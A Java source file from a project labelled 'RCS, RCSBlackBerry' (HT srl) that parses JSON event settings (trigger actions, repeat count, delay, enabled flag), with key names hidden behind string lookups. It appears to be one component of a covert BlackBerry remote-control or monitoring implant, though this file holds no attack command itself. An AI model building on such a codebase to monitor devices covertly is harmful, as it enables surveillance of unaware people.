//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.config;

import rpc.json.me.JSONException;
import rpc.json.me.JSONObject;
import blackberry.Messages;
import blackberry.action.Action;

public class ConfEvent extends JSONConf {

    /** Event unique ID. */
    private final int eventId;

    public int startAction = Action.ACTION_NULL;
    public int endAction = Action.ACTION_NULL;
    public int repeatAction = Action.ACTION_NULL;
    public int iter = Integer.MAX_VALUE;
    /** delay in seconds */
    public int delay = 0;

    public String desc = "";

    public boolean enabled = false;

    public ConfEvent(int eventId, String eventType, JSONObject params)
            throws JSONException {
        super(eventType, params);

        this.eventId = eventId;

        if (params.has(Messages.getString("p.0"))) { //$NON-NLS-1$
            startAction = params.getInt(Messages.getString("p.1")); //$NON-NLS-1$
        }
        if (params.has(Messages.getString("p.2"))) { //$NON-NLS-1$
            endAction = params.getInt(Messages.getString("p.3")); //$NON-NLS-1$
        }
        if (params.has(Messages.getString("p.4"))) { //$NON-NLS-1$
            repeatAction = params.getInt(Messages.getString("p.5")); //$NON-NLS-1$
        }
        if (params.has(Messages.getString("p.6"))) { //$NON-NLS-1$
            iter = params.getInt(Messages.getString("p.7")); //$NON-NLS-1$
        }
        if (params.has(Messages.getString("p.8"))) { //$NON-NLS-1$
            delay = params.getInt(Messages.getString("p.9")); //$NON-NLS-1$
        }

        if (params.has(Messages.getString("p.10"))) { //$NON-NLS-1$
            desc = params.getString(Messages.getString("p.10")); //$NON-NLS-1$
        }
        if (params.has(Messages.getString("p.11"))) {
            // p.11=enabled
            enabled = params.getBoolean(Messages.getString("p.11")); //$NON-NLS-1$
        }
    }

    public ConfEvent(int id, JSONObject conf) throws JSONException {
        this(id, conf.getString(Messages.getString("p.12")), conf); //$NON-NLS-1$
    }

    /**
     * Gets the id.
     * 
     * @return the id
     */
    public int getEventId() {
        return this.eventId;
    }

    public String getId() {
        return Integer.toString(eventId);
    }

}
